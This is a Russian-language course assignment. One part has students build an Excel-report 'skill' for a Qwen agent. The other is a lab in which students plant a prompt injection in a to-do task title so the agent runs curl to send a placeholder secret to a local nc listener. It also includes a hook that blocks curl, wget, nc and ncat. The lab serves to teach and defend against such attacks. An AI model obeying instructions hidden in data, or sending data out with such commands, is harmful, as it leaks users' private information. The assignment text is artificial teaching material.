## 1. Отчёт по задачам (4 балла)

**Цель:** делегировать агенту написание отчётов по задачам из списка TODO так, чтобы отчёт получался одинаковым и правильным от раза к разу.

На практике (часть 2) агент собирал Excel-отчёт с нуля: каждый раз ставил библиотеки, писал код и делал по-разному.
Здесь вы сначала посмотрите на это внимательнее, а потом вынесете повторяющуюся работу в skill.

Skill — это папка с `SKILL.md` (инструкция) и, при желании, скриптами и шаблонами. Агент видит только `name` и `description` всех skills,
а тело `SKILL.md` загружает сам, когда решит, что skill подходит к задаче.

**1.0. Насемплите задачи в базу.** Приложение должно быть запущено:

```bash
cd apps
python seed.py ${N} --url ${APP_URL} --seed 42      # например, N=100, APP_URL=http://127.0.0.1:5000
```

`--seed 42` даёт один и тот же набор задач, поэтому прогоны можно сравнивать между собой. Сроки считаются от сегодняшней даты:
все прогоны лучше делать в один день.

**1.1. Придумайте формат отчёта.** Требования:
- отчёт работает с задачами и учитывает статус (выполнена или нет), сроки (дедлайны) и приоритет;
- итоговый отчёт — Excel-файл (`.xlsx`);
- в файле минимум два листа.

Опишите формат текстом: какие листы, какие колонки и метрики, как считается каждая цифра. Это описание понадобится в 1.2 и 1.4.

**1.2. Попросите агента сделать отчёт (без skill).**
Запускайте агента из `practice/agent`: все артефакты (скрипты, файлы отчётов) должны создаваться внутри этой директории.
Дайте агенту описание формата из 1.1 и попросите сделать отчёт. Повторите несколько раз, каждый раз в новой сессии
и очищая рабочую директорию от артефактов агента (удаляйте всё, кроме `.qwen/`). Экспортируйте траектории (`/export`).
Отличаются ли цифры в отчётах? А сам формат отчёта?

> В конфиге агента специально отключена память (`memory` в `settings.json`), чтобы агент не переносил опыт между прогонами и не мешал работать с игрушечными задачами.

**1.3. На подумать: где агент спотыкается.**
Посмотрите на траектории из 1.2 и выпишите, с какими проблемами сталкивается агент, когда пишет отчёт сам:
что он каждый раз ставит и пишет заново, где ошибается (даты, подсчёты, формат), сколько шагов и токенов на это уходит, что меняется от прогона к прогону.
Какие из этих проблем уберёт детерминированный скрипт, а какие нет? Это и есть мотивация вынести работу в skill.

**1.4. Напишите skill `make_report`.** Создайте `practice/agent/.qwen/skills/make_report/`:
- детерминированная часть — Python-скрипт, который считает статистики и собирает `.xlsx` в формате 1.1;
- `SKILL.md`: frontmatter с `name` и `description` (что делает skill и когда его применять) и короткая инструкция:
  откуда брать данные, как запустить скрипт, куда он сохранит файл, как проверить результат.

Скрипт можно написать руками или с помощью агента. Во втором случае напишите для агента подробное ТЗ и тесты, по которым он проверит скрипт:

Чтобы подключить skill, достаточно положить папку в нужное место. Перезапустите `qwen` и проверьте, что skill виден в `/skills`.

**1.5. Попросите агента сделать отчёт со skill.** Короткой просьбой, без описания формата и без имени skill, например «сделай отчёт по задачам в Excel».

## 2. Prompt injection (3 балла)

У агента с подключённым `todo` есть «смертельная триада»: приватные данные (задачи), недоверенный контент (названия задач может написать кто угодно)
и канал наружу (shell). Задача: с помощью prompt injection заставить агента **отправить что-то наружу** через `curl` — инструкцию даёт не пользователь, а данные.

### Атака

Цель — при обычной работе с агентом добиться, чтобы он сам выполнил команду вида (заглушка `SECRET` придёт в терминал-приёмник):

```bash
curl "http://127.0.0.1:9999/?data=SECRET"
```

Откройте «приёмник» в отдельном терминале, он будет печатать всё, что к нему пришло:

```bash
nc -lk 9999
```

- через веб-интерфейс создайте задачу, название которой содержит скрытую инструкцию;
- пообщайтесь с агентом так, чтобы он эту инструкцию выполнил.

Для атаки разрешается менять `server.py` в MCP-сервере (добавлять свои tools, resources и prompts).
Проверьте в обычном режиме и с `--approval-mode yolo`. Сколько попыток понадобилось?

Подсказки:
- как модель видит команду пользователя у себя в контексте?
- как с помощью MCP можно положить в контекст что-то недоверенное?
- можно написать специальный MCP resource, который упростит атаку (подставит название задачи в контекст по `@`).

### Защита

Напишите hook, запрещающий `curl`. Hook — это скрипт, который Qwen запускает перед каждым вызовом tool;
он читает из stdin JSON с именем tool и аргументами и печатает решение `allow` / `deny`.

1. Создайте `practice/agent/.qwen/hooks/guard.py`:

```python
#!/usr/bin/env python3
# PreToolUse-hook: запрещает сетевые команды из shell.
import json
import re
import sys

data = json.load(sys.stdin)
tool = data.get("tool_name", "")
args = data.get("tool_input", {})


def decide(decision, reason):
    print(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": decision,       # allow / deny
        "permissionDecisionReason": reason,
    }}, ensure_ascii=False))
    sys.exit(0)


if tool == "run_shell_command" and re.search(r"\b(curl|wget|nc|ncat)\b", args.get("command", "")):
    decide("deny", "Сетевые команды запрещены.")

decide("allow", "ok")
```

2. Подключите его в `practice/agent/.qwen/settings.json` (на верхнем уровне, рядом с `model`):

```json
"hooks": {
  "PreToolUse": [
    {
      "matcher": "^run_shell_command$",
      "hooks": [
        { "type": "command", "command": "python \"$QWEN_PROJECT_DIR/.qwen/hooks/guard.py\"", "timeout": 10 }
      ]
    }
  ]
}
```

Hooks проекта загружаются только в доверенной папке. Перезапустите `qwen` (или откройте `/hooks`, чтобы перечитать настройки).

3. Повторите атаку. Что теперь произошло?

### На подумать

- Почему список запретов в hook не заменяет песочницу и сетевые ограничения?

### Что сдать

- ответы на вопросы.

Prompt — это не обязательно просто заполнение шаблона: внутри может быть и более сложная логика —
обработка данных, походы в API, выборка и агрегация. Результат — сообщение (или несколько), которое уходит модели.

Реализуйте для него `@mcp.prompt()` в `server.py`.
